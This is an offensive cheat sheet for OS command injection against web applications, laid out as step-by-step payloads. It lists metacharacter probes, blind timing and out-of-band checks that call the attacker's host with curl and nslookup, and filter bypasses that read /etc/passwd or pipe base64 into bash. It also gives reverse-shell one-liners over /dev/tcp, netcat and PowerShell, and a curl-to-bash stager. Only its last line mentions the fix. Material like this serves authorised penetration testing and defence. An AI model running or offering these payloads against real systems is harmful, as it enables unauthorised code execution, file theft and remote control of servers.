Command Injection - Cheat Sheet

Abuse an app that passes user input into a system shell command, so your input
becomes extra commands the server runs - leading to code execution as the web
user (and often a straight path to a reverse shell). Distinct from code
injection: here you inject OS shell syntax.
Replace the placeholders (<...>) with your own values.


Step 1 - Find injectable inputs

Anywhere the app likely shells out: ping/traceroute/nslookup tools, file
converters, PDF/image processors, "export", filename fields, git/archive ops.

Inject shell metacharacters and watch for command output or timing changes:

    ;   |   ||   &   &&   `cmd`   $(cmd)   %0a (newline)


Step 2 - Confirm (in-band first)

Append a command to the expected input:

    <input>; id
    <input> | id
    <input> && id
    <input> $(id)
    <input> `id`

If you see uid=... in the response, that's execution. On Windows try:

    <input> & whoami       <input> | whoami       & ipconfig


Step 3 - Blind confirmation (no output shown)

Time-based - the response hangs if the command runs:

    <input>; sleep 5
    <input> && ping -c 5 127.0.0.1
    Windows:  & ping -n 5 127.0.0.1

Out-of-band (OOB) - make the server call you:

    <input>; curl http://<your-ip>/`whoami`
    <input>; nslookup `whoami`.<your-collab-domain>
    # catch on: python3 -m http.server 80  / interactsh / Burp Collaborator


Step 4 - Filter / space / keyword bypasses

    No spaces:      cat</etc/passwd    {cat,/etc/passwd}    cat$IFS/etc/passwd    ${IFS}
    Blocked chars:  use $(...) if backticks filtered, or newline %0a
    Keyword split:  w'h'oami   wh$@oami   c\at /etc/passwd   /???/??t /etc/passwd
    Blacklist evade: base64 -d then pipe to sh:
        echo aWQ=|base64 -d|bash
    Concatenation:  a=who;b=ami;$a$b


Step 5 - Get a shell

    # reverse shell (start a listener first: nc -lvnp 4444)
    <input>; bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'
    <input>; busybox nc <your-ip> 4444 -e /bin/sh
    # if only OOB works, stage: download + run
    <input>; curl http://<your-ip>/s.sh|bash

    Windows:
    & powershell -e <base64-encoded reverse shell>


Step 6 - Stabilise & escalate

    # upgrade a dumb shell to a PTY:
    python3 -c 'import pty;pty.spawn("/bin/bash")'  ; then Ctrl-Z, stty raw -echo, fg
    # then: local enumeration + privesc (see linux-privesc / windows-privesc)


Quick payload menu
    Linux:   ; id  | id  && id  $(id)  `id`  ; sleep 5  ; bash -c '...'
    Windows: & whoami  | whoami  && whoami  & ping -n 5 127.0.0.1
    OOB:     ; curl http://<ip>/`whoami`   ; nslookup `whoami`.<collab>


Key idea: command injection happens when user input is concatenated into a
shell command instead of being passed as a safe argument. A metacharacter
(; | & $() ``) ends the intended command and starts yours, running as the web
service account. Confirm with id/whoami (or timing/OOB when blind), bypass
filters with $IFS / quoting / encoding, then pop a reverse shell. The fix is to
avoid the shell entirely (use exec-array APIs, never string concatenation).
